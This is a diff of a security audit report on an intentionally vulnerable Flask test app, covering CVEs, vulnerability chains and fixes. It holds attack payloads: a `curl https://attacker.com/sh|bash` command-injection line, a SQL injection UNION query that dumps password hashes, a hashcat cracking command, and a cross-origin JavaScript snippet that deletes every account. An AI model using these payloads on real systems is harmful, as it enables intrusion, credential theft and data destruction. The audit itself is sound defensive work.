+**Evidence:** `flask-cors==3.0.10`
 
-**Evidence:** `requirements.txt` does not include `flask-limiter` or any equivalent. No `@limiter.limit()` decorator appears on the `/login` route.
+**Exploitability:** An attacker crafts request paths matching a broad, permissive regex instead of the intended narrow rule, bypassing CORS restrictions on protected endpoints.
 
-**Exploitability:** An attacker with a list of common passwords can brute-force the `/login` endpoint with no throttling. MD5's speed makes offline cracking (after a DB dump) equally trivial.
+**Remediation:** Upgrade flask-cors to ≥ 5.0.2.
 
-**Remediation:** Add `flask-limiter`:
-```python
-from flask_limiter import Limiter
-limiter = Limiter(app, key_func=get_remote_address)
+---
 
-@app.route("/login", methods=["POST"])
-@limiter.limit("5 per minute")
-def login(): ...
+### [MEDIUM-3] flask-cors 3.0.10 — CVE-2024-6866: Case-Insensitive Path Matching Bypass
+**ID:** DC-5
+**Location:** `requirements.txt:2`
+**Description:** flask-cors ≤5.0.1 performs case-insensitive URL path matching (a function meant for hostnames), allowing mixed-case request paths (e.g. `/Admin/users`) to bypass CORS restrictions applied to `/admin/users`.
+
+**Evidence:** `flask-cors==3.0.10`
+
+**Exploitability:** Attacker uses `/Admin/delete/1` instead of `/admin/delete/1` to bypass path-specific CORS restrictions after they are tightened.
+
+**Remediation:** Upgrade flask-cors to ≥ 5.0.2. (Single upgrade resolves MEDIUM-1, MEDIUM-2, and MEDIUM-3.)
+
+**Suggested Fix:**
 ```
-Also implement a temporary account lockout after N consecutive failures.
+# requirements.txt — one change resolves all three flask-cors medium findings
+flask-cors>=5.0.2
+```
 
 ---
 
 ## Low Findings
 
-### [LOW-1] Missing HTTP Security Response Headers
+### [LOW-1] Werkzeug 2.0.1 — CVE-2023-23934: `__Host-` Cookie Prefix Bypass
+**ID:** DC-8
+**Location:** `requirements.txt:3`
+**Description:** Werkzeug before 2.2.3 misparses nameless cookies (e.g. `=value`), allowing a `__Host-` security-prefix to be bypassed by an attacker who controls a sibling subdomain.
 
-**Location:** `app.py` (global — no middleware sets headers)
-**Description:** The application returns no security-relevant HTTP headers: no `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, or `Referrer-Policy`. These headers are a defense-in-depth layer against XSS, clickjacking, MIME-sniffing, and downgrade attacks.
+**Evidence:** `Werkzeug==2.0.1`
 
-**Evidence:** No `after_request` hook or `flask-talisman` / `flask-seasurf` dependency appears anywhere in the codebase.
+**Exploitability:** Requires the attacker to control a subdomain of the application's host and the application to use `__Host-` prefixed cookies (it does not currently). Low practical impact in this specific configuration.
 
-**Exploitability:** Low in isolation; these headers mitigate browser-side attacks that compound other vulnerabilities (e.g., a reflected XSS made more dangerous by the absence of CSP).
-
-**Remediation:** Add `flask-talisman` (one line) or set headers manually:
-```python
-from flask_talisman import Talisman
-Talisman(app, content_security_policy={"default-src": "'self'"})
-```
+**Remediation:** Resolved by upgrading Werkzeug to ≥ 3.0.3 (already recommended in HIGH-6 — no additional action required).
 
 ---
 
 ## Vulnerability Chains
 
-### Chain A — Unauthenticated One-Request OS Takeover
+### Chain A — Unauthenticated Full Credential Dump in One Request
+**Findings:** CRITICAL-4 (SQL injection `/search`) → HIGH-1 (Unsalted MD5) → HIGH-2 (Hardcoded admin hash)
 
-**Findings involved:** CRITICAL-1 (Command Injection), MEDIUM-1 (0.0.0.0 binding)
-
-The `/ping` endpoint is unauthenticated and exposed on all interfaces. A single crafted GET request achieves arbitrary OS command execution:
-
-```
-GET /ping?host=;curl+https://attacker.com/sh|bash HTTP/1.1
-```
-
-From that shell, an attacker can read `app.py` to obtain the hardcoded `API_KEY`, `DB_PASSWORD`, and `JWT_SECRET` (CRITICAL-6), then forge session cookies to impersonate any user. **Severity: CRITICAL — full system compromise in one request.**
+`GET /search?q=%25' UNION SELECT password_hash,username FROM users WHERE '1'='1` extracts every password hash without authentication. Because passwords are unsalted MD5, **all hashes reverse to plaintext within seconds** using free online rainbow tables; the admin hash (`admin123`) resolves instantly. An attacker has every user's plaintext password in under one minute, starting with zero knowledge and zero credentials.
 
 ---
 
-### Chain B — Full Credential Harvest Without a Login
+### Chain B — Three Independent Unauthenticated Paths to Full Server RCE
+**Findings:** CRITICAL-1 (Command injection) + CRITICAL-2 (SSTI) + CRITICAL-9 (Debug mode + 0.0.0.0)
 
-**Findings involved:** CRITICAL-5 (Missing Auth on /admin), CRITICAL-4 (SQLi in /search), HIGH-1 (Weak MD5)
+Three fully independent RCE vectors exist simultaneously:
+1. `/ping?host=x;id` → OS command execution via shell injection
+2. `/render?name={{...}}` → Python object traversal via Jinja2
+3. Any exception → Werkzeug interactive Python console, network-accessible on `0.0.0.0`
 
-1. `GET /admin/users` → returns all usernames, IDs, and roles (no auth required).
-2. `GET /search?q=x%' UNION SELECT password_hash,role FROM users WHERE '1'='1` → dumps all MD5 hashes.
-3. `hashcat -m 0 hashes.txt rockyou.txt` → cracks all hashes in seconds to minutes given MD5's speed and the lack of salting.
-
-Result: plaintext passwords for every account, with no authentication ever attempted against the target app. **Severity: CRITICAL — full credential harvest without credentials.**
+Patching one leaves two others. All three require zero authentication, zero prior knowledge, and a single HTTP request. The server is fully compromised from **any host that can reach port 5000**.
 
 ---
 
-### Chain C — Session Forgery via SSTI + Hardcoded SECRET_KEY
+### Chain C — Cross-Origin Silent Account Wipe (CSRF via Reflected CORS)
+**Findings:** CRITICAL-5 (Missing auth `/admin/users`) + CRITICAL-6 (Missing auth `/admin/delete`) + HIGH-4 (Wildcard CORS with credentials)
 
-**Findings involved:** CRITICAL-2 (SSTI), CRITICAL-6 (Hardcoded JWT_SECRET)
+flask-cors reflects the `Origin` header when `supports_credentials=True`, so any domain gets credentialed cross-origin access. A malicious page silently enumerates all user IDs from `/admin/users`, then deletes every account via `/admin/delete/<id>` — all in the victim's browser session, triggered by a single page visit:
 
-Even without the source code, the SSTI in `/render` exposes the running Flask configuration:
-
+```javascript
+// Executes silently while victim has the app open in another tab
+fetch('http://app.internal:5000/admin/users', {credentials: 'include'})
+  .then(r => r.json())
+  .then(users => users.forEach(u =>
+    fetch(`http://app.internal:5000/admin/delete/${u.id}`,
+          {method: 'POST', credentials: 'include'})
+  ));
 ```
-GET /render?name={{config['SECRET_KEY']}}
-→ Response: <h1>Hello, supersecret!</h1>
-```
 
-With `SECRET_KEY = "supersecret"` in hand, an attacker uses Python's `itsdangerous` (Flask's session-signing library) to forge a session cookie claiming `{"user": "admin", "role": "admin"}`. Every subsequent request with this forged cookie authenticates as admin — bypassing the login endpoint entirely. **Severity: CRITICAL — authentication completely nullified.**
+---
+
+### Chain D — Known `SECRET_KEY` Survives All Future Auth Patches
+**Findings:** CRITICAL-8 (Hardcoded `SECRET_KEY = "supersecret"`) → Any auth added to fix CRITICAL-5/6
+
+Even after SQL injection and missing-auth findings are patched, an attacker who has read the source code (or guessed `"supersecret"`) retains persistent admin access by forging Flask session cookies offline. The forged cookie is accepted by any auth decorator that validates `session["user_id"]` and `session["role"]`. **This bypass is invisible in access logs and survives all future auth fixes until the key is rotated and externalized.**
 
 ---
 
 ## Positive Observations
 
-- **One parameterized query exists.** The `admin_delete_user` handler at `app.py:98` uses `conn.execute("DELETE FROM users WHERE id = ?", (user_id,))` — demonstrating the developer knows the correct pattern; the SQLi vulnerabilities are divergences from this.
-- **Integer type coercion on route parameter.** `<int:user_id>` in `/admin/delete/<int:user_id>` prevents non-integer values from reaching the handler, eliminating one class of input-injection on that path.
-- **The application is clearly self-labeled as a test target.** Both the module docstring (`"DO NOT DEPLOY"`) and `README.md` make the intent explicit, reducing accidental deployment risk.
-- **Database initialization is idempotent.** `CREATE TABLE IF NOT EXISTS` and `INSERT OR IGNORE` prevent duplicate-seed errors on restart.
-- **Werkzeug is already a dependency.** `werkzeug.security.generate_password_hash` / `check_password_hash` (bcrypt-backed) is available without adding any new dependency — the remediation for weak hashing has zero dependency cost.
+- **`/admin/delete` already uses parameterized queries** (`conn.execute("DELETE FROM users WHERE id = ?", (user_id,))`) — the developer knows the correct pattern; the injection bugs elsewhere are oversights, not ignorance.
+- **`<int:user_id>` route converter** on the delete endpoint rejects non-integer IDs at the Flask routing layer before any application code runs.
+- **Small dependency footprint** — only three packages in `requirements.txt`, making the upgrade surface minimal and auditable in an afternoon.
+- **Honest inline documentation** — `# === Vuln: ... ===` comments throughout `app.py` make every vulnerability self-documenting; the `README.md` clearly warns against deployment.
+- **Global error handler exists** — the structure is correct; only the response payload (returning the traceback) needs to be changed.
 
 ---
 
 ## Recommendations
 
-1. **[Immediate] Take the service offline if running anywhere.** Any of the three RCE paths (CRITICAL-1, CRITICAL-2) or the auth-bypass chain (CRITICAL-3) are exploitable in seconds.
+1. **[Immediate — 5 min]** Take the application offline or firewall port 5000 from all non-localhost traffic. Three independent unauthenticated RCE paths exist; no partial patch makes this safe to expose.
 
-2. **[Day 1] Fix all injection sinks.** Replace string-concatenated SQL with parameterized queries (`?` placeholders) in `/login` and `/search`. Replace `shell=True` subprocess with an argument list and input validation in `/ping`. Pass `name` as a template variable rather than concatenating it in `/render`.
+2. **[Immediate — 15 min]** Fix both RCE-from-HTTP endpoints: replace `shell=True` with an argument list in `/ping`; pass `name` as a Jinja2 variable in `/render`. These are one- or two-line changes each.
 
-3. **[Day 1] Add authentication to `/admin/*`.** Implement a session-or-JWT authentication decorator; apply it to every `/admin/` route. Add role-based access control (`role == 'admin'`) as a second gate.
+3. **[Immediate — 5 min]** Disable debug mode and restrict the bind host: `DEBUG = os.getenv(..., "false")`, `host = os.getenv("FLASK_HOST", "127.0.0.1")`. Eliminates the third RCE vector.
 
-4. **[Day 1] Remove hardcoded secrets.** Rotate `API_KEY`, `DB_PASSWORD`, and `JWT_SECRET` immediately. Load all secrets from environment variables or a secrets manager at runtime. Audit git history for past commits containing these values.
+4. **[Immediate — 15 min]** Parameterize both injectable `conn.execute()` calls using the `?` placeholder pattern already present in `admin_delete_user`. Two-line fix per query.
 
-5. **[Day 2] Replace MD5 with bcrypt.** Migrate to `werkzeug.security.generate_password_hash` (available at zero extra dependency cost). Invalidate and re-hash existing stored passwords on next login.
+5. **[Same day — 30 min]** Externalize all secrets to environment variables and **immediately revoke and rotate the `sk-prod-*` API key** — treat it as compromised. Generate a cryptographically random `FLASK_SECRET_KEY`; invalidate all existing sessions.
 
-6. **[Day 2] Disable debug mode.** Remove `app.config["DEBUG"] = True` and `debug=True` from `app.run()`. Gate on `FLASK_ENV` environment variable. Deploy behind Gunicorn, not the Werkzeug dev server.
+6. **[Same day — 1–2 hr]** Add the `@require_admin` decorator to both `/admin/*` routes; update `/login` to write `session["user_id"]` on success.
 
-7. **[Day 2] Tighten CORS.** Replace `origins="*"` with an explicit list of trusted frontend origins. Verify `supports_credentials=True` is still needed after other auth changes.
+7. **[Same day — 10 min]** Upgrade all three dependencies to patched versions:
+   ```
+   Flask>=2.3.2
+   flask-cors>=5.0.2
+   Werkzeug>=3.0.3
+   ```
+   This resolves CVE-2023-30861, CVE-2024-6221, CVE-2024-6839, CVE-2024-6866, CVE-2023-25577, CVE-2023-46136, and CVE-2023-23934 in a single `pip install -r requirements.txt`.
 
-8. **[Day 3] Suppress stack traces.** Update the error handler to log tracebacks server-side only; return a generic `{"error": "Internal server error"}` to callers.
+8. **[This week — 1 hr]** Replace MD5 with bcrypt for all password hashing; regenerate the admin seed from `os.environ["ADMIN_PASSWORD"]`; require a password reset for all existing users since existing MD5 hashes must be treated as cracked.
 
-9. **[Week 1] Upgrade dependencies.** Pin `Flask>=3.0`, `Werkzeug>=3.0`, and add `pip-audit` to CI to catch future CVEs automatically.
+9. **[This week — 30 min]** Suppress tracebacks from HTTP responses (log server-side); add the security headers `after_request` hook; restrict CORS to an explicit origin allowlist.
 
-10. **[Week 1] Add `flask-limiter` and security headers.** Rate-limit `/login` (5 req/min per IP), add account lockout logic, and install `flask-talisman` for CSP/HSTS/X-Frame-Options headers.
+10. **[This week — 30 min]** Add `flask-limiter` with a 5-per-minute limit on `/login`; add `app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024` as multipart-DoS defence.
+
+11. **[Ongoing]** Add `pip-audit` or `safety check` as a CI step to detect newly published CVEs against pinned dependencies automatically. Deploy via Gunicorn behind nginx — never the Flask development server — in all non-local environments.
